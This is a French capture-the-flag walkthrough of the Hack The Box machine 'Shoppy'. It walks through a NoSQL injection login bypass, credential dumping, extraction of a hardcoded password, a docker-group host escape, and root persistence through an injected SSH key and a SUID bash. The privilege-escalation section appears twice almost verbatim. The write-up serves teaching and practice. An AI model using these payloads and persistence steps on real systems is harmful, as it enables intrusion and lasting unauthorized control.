![Cover](cover.png)

# Phase 1 : Reconnaissance & Brèche Initiale

## 1. Énumération Réseau (Scanning)

Ma méthodologie commence par un scan **Nmap** complet pour identifier la surface d'attaque. Le serveur cible semble être une instance Linux (Debian) hébergeant plusieurs services web.

```bash
# Scan rapide de tous les ports
nmap -p- --min-rate 10000 10.10.11.180

# Scan de version et scripts par défaut sur les ports identifiés
nmap -p 22,80,9093 -sCV 10.10.11.180
```

**Résultats clés :**
*   **Port 22 (SSH)** : OpenSSH 8.4p1.
*   **Port 80 (HTTP)** : Nginx 1.23.1. Redirige vers `http://shoppy.htb`.
*   **Port 9093 (HTTP)** : Service inconnu retournant des métriques (type **Prometheus AlertManager**).

J'ajoute immédiatement l'entrée correspondante dans mon fichier `/etc/hosts` pour résoudre le domaine.

## 2. Énumération Web & Virtual Host Fuzzing

Le site principal sur `shoppy.htb` est une page "Coming Soon". Pour découvrir d'éventuels sous-domaines, j'utilise **wfuzz** en filtrant les réponses par défaut (169 caractères).

```bash
wfuzz -u http://10.10.11.180 -H "Host: FUZZ.shoppy.htb" -w /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt --hh 169
```

Le fuzzing révèle le sous-domaine `mattermost.shoppy.htb`. Je l'ajoute également à mon fichier `/etc/hosts`.

En parallèle, je lance une énumération de répertoires avec **feroxbuster** sur le domaine principal :

```bash
feroxbuster -u http://shoppy.htb -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
```

**Endpoints identifiés :**
*   `/login` : Formulaire d'authentification.
*   `/admin` : Redirige vers `/login`.
*   `/exports` : Répertoire potentiellement sensible.

> **Schéma Mental :** L'absence de fichiers `.php` ou `.html` classiques et le comportement des routes suggèrent une application **Node.js** ou un framework moderne utilisant un moteur de routage dynamique.

## 3. Identification de la vulnérabilité : NoSQL Injection

Lors de mes tests sur le formulaire de login, l'injection de caractères spéciaux comme `'` provoque un **504 Gateway Time-out**. Ce comportement erratique est souvent le signe qu'une requête malformée bloque le backend.

En testant des payloads **NoSQL Injection** (communs sur les stacks Node.js/MongoDB), je tente de manipuler la logique de la requête `$where`.

### Authentification Bypass
Le payload suivant est injecté dans le champ `username` :
`admin' || 'a'=='a`

```http
POST /login HTTP/1.1
Host: shoppy.htb
Content-Type: application/x-www-form-urlencoded

username=admin' || 'a'=='a&password=admin
```

**Résultat :** Le serveur répond par un **302 Found** vers `/admin`. La condition `'a'=='a'` étant toujours vraie, la requête MongoDB retourne le premier utilisateur trouvé (l'administrateur) sans vérifier le mot de passe.

> **Schéma Mental :** La vulnérabilité réside dans l'utilisation de données non assainies à l'intérieur d'une clause `$where` ou d'une fonction `eval()` côté base de données. La requête finale ressemble à : `db.users.find({ $where: "this.username == 'admin' || 'a'=='a' && this.password == '...'" })`.

## 4. Exfiltration de données & Pivot Mattermost

Une fois dans le panel `/admin`, j'accède à la fonctionnalité `/admin/search-users`. Cette fonction est également vulnérable à la même **NoSQL Injection**.

En recherchant `admin' || 'a'=='a`, l'application génère un export JSON contenant tous les utilisateurs de la base de données.

**Données récupérées :**
*   `admin` : Hash MD5 (non crackable immédiatement).
*   `josh` : `josh:orange` (Hash MD5 `08449460...` cracké via **CrackStation**).

### Accès à Mattermost
Je tente ces identifiants sur `mattermost.shoppy.htb`. L'accès est validé pour l'utilisateur **josh**.
En explorant les canaux de discussion :
1.  Dans **#Development**, Josh mentionne un gestionnaire de mots de passe en C++.
2.  Dans **#Deploy Machine**, je trouve une conversation privée entre **Josh** et **Jaeger** contenant des identifiants de déploiement.

**Credentials trouvés :** `jaeger:Sh0ppyBest@pp!`

## 5. Premier Shell (Foothold)

Les identifiants récupérés sur Mattermost sont testés via **SSH**.

```bash
ssh jaeger@shoppy.htb
# Password: Sh0ppyBest@pp!
```

L'accès est réussi. Je récupère le premier flag dans `/home/jaeger/user.txt`. L'énumération locale révèle que l'application tourne dans `/home/jaeger/ShoppyApp`, confirmant mes soupçons sur la stack **Node.js**.

---

### Énumération Interne & Mouvement Latéral

Une fois l'accès initial obtenu via **SSH** avec le compte **jaeger**, l'objectif est d'identifier les vecteurs d'escalade de privilèges vers un utilisateur plus privilégié ou vers le compte **root**.

#### 1. Énumération du compte jaeger

L'énumération standard commence par la vérification des droits **sudo** et l'inspection des fichiers appartenant à d'autres utilisateurs.

```bash
# Vérification des privilèges sudo
sudo -l

# Résultat :
# User jaeger may run the following commands on shoppy:
#    (deploy) /home/deploy/password-manager
```

Le binaire `/home/deploy/password-manager` peut être exécuté avec les privilèges de l'utilisateur **deploy**. L'inspection du répertoire `/home/deploy` montre la présence du binaire, de son code source (inaccessible) et d'un fichier `creds.txt` (inaccessible).

> **Schéma Mental : Exploitation de Binaire Sudo**
> 1. **Vecteur** : Un binaire appartenant à **deploy** est exécutable par **jaeger** via **sudo**.
> 2. **Objectif** : Comprendre la logique du binaire pour extraire des informations ou détourner son exécution.
> 3. **Contrainte** : Le binaire demande un "Master Password". S'il est validé, il lit `creds.txt`.

#### 2. Reverse Engineering : password-manager

Pour trouver le mot de passe maître, j'analyse le binaire. Une analyse statique avec **strings** est souvent suffisante avant de passer à des outils plus lourds comme **Ghidra**.

```bash
# Recherche de chaînes de caractères (encodage 16-bit/wide characters)
strings -el password-manager

# Résultat :
# Sample
```

Le binaire compare l'entrée utilisateur à la chaîne statique `Sample`. Si la condition est remplie, il exécute `system("cat /home/deploy/creds.txt")`.

```bash
# Exécution pour obtenir les credentials de deploy
sudo -u deploy /home/deploy/password-manager
# Password: Sample -> Deploying@pp!

# Passage à l'utilisateur deploy
su deploy
```

#### 3. Escalade de Privilèges : de deploy à root

L'énumération des groupes de l'utilisateur **deploy** révèle une configuration critique courante dans les environnements de développement.

```bash
id
# uid=1001(deploy) gid=1001(deploy) groups=1001(deploy),998(docker)
```

L'appartenance au groupe **docker** est équivalente à un accès **root** complet sur l'hôte. En effet, un utilisateur capable d'interagir avec le **Docker Daemon** peut monter n'importe quel répertoire du système de fichiers de l'hôte (y compris `/`) à l'intérieur d'un conteneur où il possède les droits **root**.

> **Schéma Mental : Docker-to-Host Escape**
> 1. **Privilège** : Accès au socket Docker.
> 2. **Action** : Lancer un conteneur en montant la racine de l'hôte (`/`) dans un volume interne (ex: `/mnt`).
> 3. **Résultat** : Le système de fichiers de l'hôte est accessible sans restriction depuis le conteneur.

#### 4. Exploitation du groupe Docker

J'utilise l'image **alpine** (déjà présente sur la machine) pour monter le système de fichiers racine et utiliser `chroot` afin de basculer mon environnement de shell vers celui de l'hôte.

```bash
# Montage de la racine de l'hôte dans /mnt et exécution de chroot
docker run --rm -it -v /:/mnt alpine chroot /mnt sh

# Vérification de l'identité
id
# uid=0(root) gid=0(root) groups=0(root)
```

#### 5. Persistance et Accès Shell

Pour stabiliser l'accès sans dépendre de Docker, j'installe une clé **SSH** ou je modifie les permissions de `/bin/bash` pour créer un **SUID binary**.

```bash
# Méthode 1 : SSH Key Persistence
mkdir -p /root/.ssh
echo "ssh-ed25519 [MA_CLE_PUBLIQUE]" > /root/.ssh/authorized_keys
chmod 600 /root/.ssh/authorized_keys

# Méthode 2 : SUID Bash
chmod 4777 /bin/bash
# Utilisation ultérieure : /bin/bash -p
```

L'accès est désormais total. Le flag `root.txt` se trouve dans `/root/root.txt`.

---

### Phase 3 : Élévation de Privilèges & Domination

#### 1. Escalade Horizontale : de `jaeger` à `deploy`

Une fois l'accès **SSH** établi en tant que `jaeger`, j'inspecte les privilèges **sudo** de l'utilisateur.

```bash
# Vérification des privilèges sudo
sudo -l
# Résultat : (deploy) /home/deploy/password-manager
```

L'utilisateur `jaeger` peut exécuter un binaire spécifique avec les droits de l'utilisateur `deploy`. J'analyse le binaire `/home/deploy/password-manager` pour comprendre son fonctionnement.

> **Schéma Mental : Reverse Engineering de base**
> Exécution du binaire -> Demande de "Master Password" -> Comparaison de chaînes (String Comparison) -> Si succès : Lecture de `creds.txt` via un appel système.

En utilisant **strings** avec l'option `-el` (pour les caractères 16-bit Little Endian, fréquents en C++), je parviens à extraire le mot de passe en clair sans passer par un désassembleur complexe comme **Ghidra**.

```bash
# Extraction des chaînes de caractères 16-bit
strings -el password-manager
# Output: Sample
```

J'exécute le binaire avec le mot de passe "Sample" pour récupérer les identifiants de `deploy`.

```bash
sudo -u deploy /home/deploy/password-manager
# Credentials trouvés : deploy / Deploying@pp!

# Passage à l'utilisateur deploy
su deploy
```

#### 2. Escalade Verticale : de `deploy` à `root`

L'énumération des groupes de l'utilisateur `deploy` révèle une configuration critique : l'appartenance au groupe **docker**.

```bash
id
# uid=1001(deploy) gid=1001(deploy) groups=1001(deploy),998(docker)
```

Être dans le groupe **docker** équivaut à un accès **root** complet sur l'hôte. Je peux monter l'intégralité du système de fichiers racine (`/`) de la machine hôte à l'intérieur d'un conteneur.

> **Schéma Mental : Abus du groupe Docker**
> Création d'un conteneur -> Montage du volume hôte (/) vers un répertoire interne (/mnt) -> Accès aux fichiers sensibles (shadow, root flags, clés SSH) depuis le conteneur.

J'utilise l'image locale `alpine` pour lancer une attaque par **Chroot Escape**.

```bash
# Exploitation Docker pour monter le système de fichiers hôte
docker run --rm -it -v /:/mnt alpine chroot /mnt sh

# Une fois dans le shell, je suis root sur l'hôte
cat /root/root.txt
```

#### 3. Persistance et Domination

Pour stabiliser mon accès sans dépendre de Docker, j'utilise deux méthodes classiques :

**Méthode A : Injection de clé SSH**
```bash
mkdir -p /root/.ssh
echo "ssh-ed25519 [MA_CLE_PUBLIQUE] attacker@kali" > /root/.ssh/authorized_keys
chmod 600 /root/.ssh/authorized_keys
```

**Méthode B : SUID Bash**
```bash
chmod 4777 /bin/bash
# Utilisation ultérieure depuis deploy :
bash -p
```

---

### Beyond Root : Analyse Post-Exploitation

L'analyse du code source de l'application **NodeJS** (ShoppyApp) permet de comprendre pourquoi l'injection **NoSQL** a fonctionné. Le serveur utilisait une requête `$where` non sécurisée, permettant d'injecter du code JavaScript arbitraire dans la logique de la base de données.

#### Analyse de la logique booléenne
Le payload utilisé était : `admin' || 'a'=='a`. Dans le moteur de base de données, la requête devient :
`this.username == 'admin' || 'a'=='a' && this.password == 'password_fourni'`

En JavaScript, l'**Operator Precedence** donne la priorité à l'opérateur **Logical AND** (`&&`) sur le **Logical OR** (`||`).

1. Le moteur évalue d'abord : `'a'=='a' && this.password == '...'`
2. Si le mot de passe est faux, cette partie devient `false`.
3. La requête devient alors : `this.username == 'admin' || false`.
4. Si l'utilisateur `admin` existe, la condition globale est `true`, bypassant ainsi la vérification du mot de passe.

#### Remédiation
Pour corriger cette vulnérabilité, il est impératif de :
1. Ne jamais utiliser l'opérateur `$where` avec des entrées utilisateurs non filtrées.
2. Utiliser des objets de requête structurés (ex: `{ username: req.body.username, password: req.body.password }`).
3. Utiliser une bibliothèque de validation de schéma comme **Joi** ou **Zod** pour s'assurer que les entrées sont des chaînes de caractères simples et non des objets ou des scripts.